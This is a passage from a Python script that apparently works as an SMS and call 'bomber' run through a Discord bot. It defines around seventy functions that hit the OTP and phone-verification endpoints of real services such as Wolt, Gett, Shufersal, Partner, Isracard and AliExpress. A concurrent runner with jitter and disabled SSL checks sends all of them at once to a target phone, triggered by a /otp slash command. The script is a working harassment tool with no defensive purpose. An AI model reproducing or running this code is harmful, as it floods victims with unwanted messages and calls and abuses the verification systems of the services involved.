         {"phoneNumber": p, "culture": "he-IL", "sendMethod": "sms"}),
    ], {"Origin": "https://www.10bis.co.il", "Referer": "https://www.10bis.co.il/"})


async def solid_wolt(session, phone):
    return await _probe_json(session, [
        ("https://restaurant-api.wolt.com/v1/guest/login",
         {"phone_number": pplus(phone), "method": "sms"}),
        ("https://restaurant-api.wolt.com/v1/guest/login",
         {"phone_number": pplus(phone), "method": "call"}),
    ])


async def solid_gett(session, phone):
    return await _probe_json(session, [
        ("https://api.gett.com/v1/login/otp", {"phone": pplus(phone)}),
        ("https://api.gett.com/v1/phone_verification", {"phone": pplus(phone)}),
    ])


async def solid_ramilevy(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www-api.rami-levy.co.il/api/v2/login/otp", {"phone": p, "phoneNumber": p}),
        ("https://www.rami-levy.co.il/api/v2/auth/send-otp", {"phone": p}),
    ], {"Origin": "https://www.rami-levy.co.il", "Referer": "https://www.rami-levy.co.il/"})


async def solid_superpharm(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://shop.super-pharm.co.il/api/auth/otp", {"mobile": p, "phone": p}),
        ("https://shop.super-pharm.co.il/rest/V1/customers/otp", {"phone": p}),
    ], {"Origin": "https://shop.super-pharm.co.il", "Referer": "https://shop.super-pharm.co.il/"})


async def solid_ace(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.ace.co.il/api/customer/sendOtp", {"phone": p, "phoneNumber": p}),
    ], {"Origin": "https://www.ace.co.il", "Referer": "https://www.ace.co.il/"})


async def solid_ace_online(session, phone):
    return await svc_ace_style(session, phone, "https://www.ace.co.il", "M2n2gnKLkgg1RhJU")


async def solid_paybox(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://api.payboxapp.com/v1/auth/otp", {"phone": p, "phoneNumber": p}),
        ("https://api.payboxapp.com/v1/auth/otp", {"phone": pplus(phone)}),
    ])


async def solid_pango(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.pango.co.il/api/otp/send", {"phone": p}),
        ("https://www.pango.co.il/api/otp/send", {"phone": p, "channel": "sms"}),
    ], {"Origin": "https://www.pango.co.il", "Referer": "https://www.pango.co.il/"})


async def solid_histadrut(session, phone):
    p = p0(phone)
    return await _probe_form(session, [
        ("https://signup.histadrut.org.il/na_ajax.php?action=sms&f=undefined", f"phone={p}"),
    ], {"Origin": "https://signup.histadrut.org.il", "Referer": "https://signup.histadrut.org.il/"})


async def solid_homework(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://homework.lnet.org.il/umbraco/Surface/HomeSurface/SendPhoneConfirmationCode", {"phone": p}),
    ])


async def solid_inter(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://api-iba-rtl.azurewebsites.net/api/users/authenticate", {"phone": p}),
    ])


async def solid_cashontab(session, phone):
    p = p0(phone)
    body1 = json.dumps({"phone": p, "type": "12", "code": "1a66",
                        "token": "e18f7e6b-d9ef-11ed-aaf2-005056120465", "lang": "2"})
    return await _probe_form(session, [
        ("https://www.cashontab.co.il/cgi-bin/JMForms", body1),
    ], {"Content-Type": "text/plain;charset=UTF-8", "Origin": "https://www.cashontab.co.il"})


async def solid_globes(session, phone):
    p = p0(phone)
    return await _probe_form(session, [
        ("https://www.globes.co.il/news/login-2022/ajax_handler.ashx?get-value-type", f"phone={p}"),
    ], {"Origin": "https://www.globes.co.il", "Referer": "https://www.globes.co.il/"})


async def solid_story(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://story.magicetl.com/public/shopify/apps/otp-login/step-one", {"phone": p}),
    ])


async def solid_zinger(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.zinger-organic.com/frontend/getindexcall", {"phone": p}),
    ])


async def solid_stips(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://stips.co.il/api", {"phone": p}),
        ("https://stips.co.il/api", {"name": "phone.validation.send_code", "phone": p}),
    ])


async def solid_payngo(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.payngo.co.il/login/init/phone/", {"phone": p}),
        ("https://www.payngo.co.il/login/init/phone/", {"telephone": p}),
    ], {"Origin": "https://www.payngo.co.il"})


async def solid_shufersal(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.shufersal.co.il/online/he/login/otp", {"phone": p}),
        ("https://www.shufersal.co.il/online/he/login/otp", {"phoneNumber": p}),
    ], {"Origin": "https://www.shufersal.co.il", "Referer": "https://www.shufersal.co.il/"})


async def solid_victory(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.victoryonline.co.il/api/otp/send", {"phone": p}),
        ("https://www.victoryonline.co.il/api/auth/otp", {"phone": p}),
    ], {"Origin": "https://www.victoryonline.co.il"})


async def solid_yochananof(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.yochananof.co.il/api/otp", {"phone": p}),
        ("https://www.yochananof.co.il/api/otp/send", {"phone": p}),
    ])


async def solid_tivtaam(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.tivtaam.co.il/api/login/otp", {"phone": p}),
        ("https://www.tivtaam.co.il/api/otp/send", {"phone": p}),
    ])


async def solid_osherad(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.osherad.co.il/api/otp", {"phone": p}),
        ("https://www.osherad.co.il/api/otp/send", {"phone": p}),
    ])


async def solid_keshet(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.keshet-teamim.co.il/api/auth/otp", {"phone": p}),
    ])


async def solid_partner(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://my.partner.co.il/api/otp/send", {"msisdn": p}),
        ("https://my.partner.co.il/api/otp/voice", {"msisdn": p}),
    ], {"Origin": "https://my.partner.co.il"})


async def solid_hotmobile(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.hotmobile.co.il/online_services/otp", {"phone": p}),
    ])


async def solid_golan(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://my.golantelecom.co.il/api/sendOtp", {"phone": p, "method": "sms"}),
        ("https://my.golantelecom.co.il/api/sendOtpVoice", {"phone": p, "method": "voice"}),
    ])


async def solid_pelephone(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://my.pelephone.co.il/api/otp", {"phone": p, "type": "sms"}),
        ("https://my.pelephone.co.il/api/otp/voice", {"phone": p, "type": "voice"}),
    ])


async def solid_012(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.012mobile.co.il/api/otp", {"phone": p}),
    ])


async def solid_019(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.019mobile.co.il/api/otp", {"phone": p}),
    ])


async def solid_wecom(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.wecom.co.il/api/auth/otp", {"phone": p}),
    ])


async def solid_bezeq(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.bezeq.co.il/api/otp/send", {"phone": p}),
    ])


async def solid_cellopark(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.cellopark.co.il/api/auth/otp", {"phone": p}),
    ])


async def solid_ahuzot(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.ahuzot.co.il/api/otp", {"phone": p}),
    ])


async def solid_ravkav(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.ravkavonline.co.il/api/otp", {"phone": p}),
        ("https://ravkavonline.co.il/api/otp/send", {"phone": p}),
    ])


async def solid_rail(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.rail.co.il/api/otp", {"phone": p}),
    ])


async def solid_isracard(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://digital.isracard.co.il/services/Proxy/CodeLogin", {"phone": p}),
        ("https://digital.isracard.co.il/services/Proxy/CodeLoginVoice", {"phone": p}),
    ])


async def solid_cal(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.cal-online.co.il/api/otp", {"mobile": p}),
    ])


async def solid_max(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.max.co.il/api/auth/otp", {"phone": p}),
    ])


async def solid_bit(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.bitpay.co.il/api/otp/send", {"phone": p}),
    ])


async def solid_buyme(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.buyme.co.il/api/otp", {"phone": p}),
    ])


async def solid_yad2(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.yad2.co.il/api/auth/otp", {"phone": p}),
        ("https://www.yad2.co.il/api/otp/send", {"phone": p}),
    ])


async def solid_madlan(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.madlan.co.il/api/otp", {"phone": p}),
    ])


async def solid_drushim(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.drushim.co.il/api/otp/send", {"phone": p}),
    ])


async def solid_alljobs(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.alljobs.co.il/api/otp", {"mobile": p}),
    ])


async def solid_issta(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.issta.co.il/api/otp", {"phone": p}),
    ])


async def solid_lametayel(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.lametayel.co.il/api/auth/otp", {"phone": p}),
    ])


async def solid_dominos(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.dominos.co.il/api/otp", {"phone": p}),
    ])


async def solid_mcdonalds(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.mcdonalds.co.il/api/otp", {"phone": p}),
    ])


async def solid_aroma(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.aroma.co.il/api/otp", {"phone": p}),
    ])


async def solid_cafecafe(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.cafecafe.co.il/api/otp", {"phone": p}),
    ])


async def solid_terminalx(session, phone):
    p = p0(phone)
    ok = await _probe_json(session, [
        ("https://www.terminalx.com/api/customer/otp", {"phone": p}),
    ], {"Origin": "https://www.terminalx.com"})
    if ok:
        return True
    return await _magento_live(session, "https://www.terminalx.com", phone)


async def solid_fox(session, phone):
    p = p0(phone)
    ok = await _probe_json(session, [
        ("https://www.fox.co.il/api/customer/sendOtp", {"phone": p}),
    ], {"Origin": "https://www.fox.co.il"})
    if ok:
        return True
    return await _magento_live(session, "https://www.fox.co.il", phone)


async def solid_castro(session, phone):
    p = p0(phone)
    ok = await _probe_json(session, [
        ("https://www.castro.com/api/customer/otp", {"phone": p}),
    ], {"Origin": "https://www.castro.com"})
    if ok:
        return True
    return await _magento_live(session, "https://www.castro.com", phone)


async def solid_golf(session, phone):
    p = p0(phone)
    ok = await _probe_json(session, [
        ("https://www.golf.co.il/api/otp", {"phone": p}),
    ], {"Origin": "https://www.golf.co.il"})
    if ok:
        return True
    return await _magento_live(session, "https://www.golf.co.il", phone)


async def solid_renuar(session, phone):
    p = p0(phone)
    ok = await _probe_json(session, [
        ("https://www.renuar.co.il/api/otp/send", {"phone": p}),
    ], {"Origin": "https://www.renuar.co.il"})
    if ok:
        return True
    return await _magento_live(session, "https://www.renuar.co.il", phone)


async def solid_laline(session, phone):
    p = p0(phone)
    ok = await _probe_json(session, [
        ("https://www.laline.co.il/api/auth/otp", {"phone": p}),
    ], {"Origin": "https://www.laline.co.il"})
    if ok:
        return True
    return await _magento_live(session, "https://www.laline.co.il", phone)


async def solid_ivory(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.ivory.co.il/api/otp", {"phone": p}),
    ])


async def solid_ksp(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.ksp.co.il/api/otp/send", {"phone": p}),
    ])


async def solid_bolt(session, phone):
    return await _probe_json(session, [
        ("https://user.live.boltsvc.net/signup/phone/verify",
         {"phone": pplus(phone), "version": "PH.2.90"}),
    ])


async def solid_micropay(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.micropay.co.il/extApi/sendOtp.php",
         {"phone": p, "type": "sms", "get": "1"}),
    ])


async def solid_aliexpress(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://login.aliexpress.com/user/buyer/join/preCheckAndSendCode",
         {"channel": p, "channelType": "PHONE", "channelPrefix": "972", "lang": "iw_IL",
          "umidTokenType": "SECURITY_TOKEN",
          "umidToken": "T2gAxV934lIJl_VDbeebC5GWS7pkx-FSt9m7gW7eNv4AaAONrIppFTebt0cnhwVeA1Y="}),
    ])


SOLID = [
    ("SOLID Mishloha", solid_mishloha),
    ("SOLID Atmos", solid_atmos),
    ("SOLID DIBS", solid_dibs),
    ("SOLID PapaJohns", solid_papajohns),
    ("SOLID CityCar", solid_citycar),
    ("SOLID Cellcom", solid_cellcom),
    ("SOLID Hamal", solid_hamal),
    ("SOLID DutyFree", solid_dutyfree),
    ("SOLID 10bis", solid_10bis),
    ("SOLID Wolt", solid_wolt),
    ("SOLID Gett", solid_gett),
    ("SOLID RamiLevy", solid_ramilevy),
    ("SOLID SuperPharm", solid_superpharm),
    ("SOLID ACE", solid_ace),
    ("SOLID ACE Online", solid_ace_online),
    ("SOLID PayBox", solid_paybox),
    ("SOLID Pango", solid_pango),
    ("SOLID Histadrut", solid_histadrut),
    ("SOLID Homework", solid_homework),
    ("SOLID Inter", solid_inter),
    ("SOLID CashOnTab", solid_cashontab),
    ("SOLID Globes", solid_globes),
    ("SOLID Story", solid_story),
    ("SOLID Zinger", solid_zinger),
    ("SOLID Stips", solid_stips),
    ("SOLID PayNGo", solid_payngo),
    ("SOLID Shufersal", solid_shufersal),
    ("SOLID Victory", solid_victory),
    ("SOLID Yochananof", solid_yochananof),
    ("SOLID TivTaam", solid_tivtaam),
    ("SOLID OsherAd", solid_osherad),
    ("SOLID Keshet", solid_keshet),
    ("SOLID Partner", solid_partner),
    ("SOLID HotMobile", solid_hotmobile),
    ("SOLID Golan", solid_golan),
    ("SOLID Pelephone", solid_pelephone),
    ("SOLID 012", solid_012),
    ("SOLID 019", solid_019),
    ("SOLID Wecom", solid_wecom),
    ("SOLID Bezeq", solid_bezeq),
    ("SOLID Cellopark", solid_cellopark),
    ("SOLID Ahuzot", solid_ahuzot),
    ("SOLID RavKav", solid_ravkav),
    ("SOLID Rail", solid_rail),
    ("SOLID Isracard", solid_isracard),
    ("SOLID Cal", solid_cal),
    ("SOLID Max", solid_max),
    ("SOLID Bit", solid_bit),
    ("SOLID Buyme", solid_buyme),
    ("SOLID Yad2", solid_yad2),
    ("SOLID Madlan", solid_madlan),
    ("SOLID Drushim", solid_drushim),
    ("SOLID AllJobs", solid_alljobs),
    ("SOLID Issta", solid_issta),
    ("SOLID Lametayel", solid_lametayel),
    ("SOLID Dominos", solid_dominos),
    ("SOLID McDonalds", solid_mcdonalds),
    ("SOLID Aroma", solid_aroma),
    ("SOLID CafeCafe", solid_cafecafe),
    ("SOLID TerminalX", solid_terminalx),
    ("SOLID Fox", solid_fox),
    ("SOLID Castro", solid_castro),
    ("SOLID Golf", solid_golf),
    ("SOLID Renuar", solid_renuar),
    ("SOLID Laline", solid_laline),
    ("SOLID Ivory", solid_ivory),
    ("SOLID KSP", solid_ksp),
    ("SOLID Bolt", solid_bolt),
    ("SOLID Micropay", solid_micropay),
    ("SOLID AliExpress", solid_aliexpress),
]


# ─────────────────────────────────────────────
# BUILD ALL SERVICES
# ─────────────────────────────────────────────
def _build_all() -> list[tuple[str, Callable]]:
    services: list[tuple[str, Callable]] = []
    services.extend(CORE)
    services.extend([_mk_mag(n, o) for n, o in MAGENTO_LIVE])
    services.extend(MAGENTO_NEW)
    services.extend(MAGENTO_NEW_2)
    services.extend(ACE_STYLE_NEW)
    services.extend(NEW_JSON)
    services.extend(EXTRA)
    services.extend(EXTRA2)
    services.extend(LIVE_JSON_NEW)
    services.extend(SOLID)
    # dedupe by (name, callable id)
    seen = set()
    deduped = []
    for n, f in services:
        key = (n, id(f))
        if key in seen:
            continue
        seen.add(key)
        deduped.append((n, f))
    return deduped


ALL_SERVICES = _build_all()

# ─────────────────────────────────────────────
# TELEMETRY
# ─────────────────────────────────────────────
@dataclass
class SvcStat:
    ok: int = 0
    fail: int = 0
    last_ok_ts: float = 0.0
    last_fail_ts: float = 0.0
    avg_lat_ms: float = 0.0

    def record(self, success: bool, latency_ms: float):
        if success:
            self.ok += 1
            self.last_ok_ts = time.time()
        else:
            self.fail += 1
            self.last_fail_ts = time.time()
        n = self.ok + self.fail
        self.avg_lat_ms = (self.avg_lat_ms * (n - 1) + latency_ms) / n if n else latency_ms


STATS: dict[str, SvcStat] = defaultdict(SvcStat)


# ─────────────────────────────────────────────
# RUNNER
# ─────────────────────────────────────────────
async def _run_one(session, name, fn, phone, sem, jitter: bool):
    async with sem:
        if jitter:
            await asyncio.sleep(random.uniform(0.0, 0.6))
        t0 = time.perf_counter()
        try:
            ok = await asyncio.wait_for(fn(session, phone), timeout=15.0)
        except Exception:
            ok = False
        latency = (time.perf_counter() - t0) * 1000.0
        STATS[name].record(bool(ok), latency)
        return (name, bool(ok), latency)


async def run_all(phone: str, concurrency: int = 60, jitter: bool = True):
    sem = asyncio.Semaphore(concurrency)
    conn = aiohttp.TCPConnector(limit=concurrency * 2, ttl_dns_cache=300, ssl=False)
    async with aiohttp.ClientSession(connector=conn) as session:
        tasks = [
            _run_one(session, n, f, phone, sem, jitter) for n, f in ALL_SERVICES
        ]
        return await asyncio.gather(*tasks)


def summarize(results) -> dict:
    hit = [n for n, ok, _ in results if ok]
    miss = [n for n, ok, _ in results if not ok]
    return {
        "total": len(results),
        "ok": len(hit),
        "fail": len(miss),
        "hit": hit,
        "miss": miss,
    }


# ─────────────────────────────────────────────
# DISCORD BOT
# ─────────────────────────────────────────────
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)


def _is_owner(uid: int) -> bool:
    return not OWNER_IDS or uid in OWNER_IDS


@bot.event
async def on_ready():
    try:
        synced = await bot.tree.sync()
        print(f"[READY] {bot.user} | synced {len(synced)} slash cmds")
    except Exception as e:
        print(f"[SYNC FAIL] {e}")
    print(f"[SERVICES] {len(ALL_SERVICES)} loaded")


@bot.tree.command(name="otp", description="Fire all OTP endpoints at a phone number")
@app_commands.describe(phone="Target phone (e.g. 0501234567 or +972501234567)", concurrency="Parallel workers (default 60)")
async def otp_cmd(interaction: discord.Interaction, phone: str, concurrency: int = 60):
    if not _is_owner(interaction.user.id):
        await interaction.response.send_message("Not yours to use.", ephemeral=True)
        return
    concurrency = max(5, min(concurrency, 200))
    await interaction.response.defer(thinking=True)
    t0 = time.perf_counter()
    results = await run_all(phone, concurrency=concurrency, jitter=True)
    elapsed = time.perf_counter() - t0
    s = summarize(results)
    hit_list = "\n".join(f"`+` {n}" for n in s["hit"][:25])
    miss_list = "\n".join(f"`-` {n}" for n in s["miss"][:15])
    embed = discord.Embed(
        title="OTP — all services fired",
        color=0x00FF88 if s["ok"] else 0xFF3355,
    )
    embed.add_field(name="Phone", value=f"`{phone}`", inline=True)
    embed.add_field(name="Hit", value=f"**{s['ok']}**/{s['total']}", inline=True)
    embed.add_field(name="Time", value=f"{elapsed:.1f}s", inline=True)
    if hit_list:
        embed.add_field(name="Hits (first 25)", value=hit_list[:1000], inline=False)
    if miss_list:
        embed.add_field(name="Miss (first 15)", value=miss_list[:1000], inline=False)
    await interaction.followup.send(embed=embed)


@bot.tree.command(name="stats", description="Per-service success/fail stats")
async def stats_cmd(interaction: discord.Interaction):
    if not _is_owner(interaction.user.id):
        await interaction.response.send_message("Not yours.", ephemeral=True)
        return
    items = sorted(
        STATS.items(),
        key=lambda kv: (kv[1].ok, -kv[1].fail),
        reverse=True,
    )[:30]
    lines = []
    for name, st in items:
        total = st.ok + st.fail
        rate = (st.ok / total * 100.0) if total else 0.0
        lines.append(f"`{name[:32]}` — {st.ok}✓ / {st.fail}✗ ({rate:.0f}%) {st.avg_lat_ms:.0f}ms")
    embed = discord.Embed(
        title="Per-service stats",
        description="\n".join(lines) or "No data yet.",
        color=0x88CCFF,
    )
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="services", description="List loaded services")
async def services_cmd(interaction: discord.Interaction):
    if not _is_owner(interaction.user.id):
        await interaction.response.send_message("Not yours.", ephemeral=True)
        return
    names = [n for n, _ in ALL_SERVICES]
    chunk = ", ".join(names[:80])
    embed = discord.Embed(
        title=f"Services ({len(names)})",
        description=f"```{chunk}{'...' if len(names) > 80 else ''}```",
        color=0x9999FF,
    )
    await interaction.response.send_message(embed=embed)


# ─────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────
if __name__ == "__main__":
    if not BOT_TOKEN:
        raise SystemExit("No BOT_TOKEN in .env")
    bot.run(BOT_TOKEN)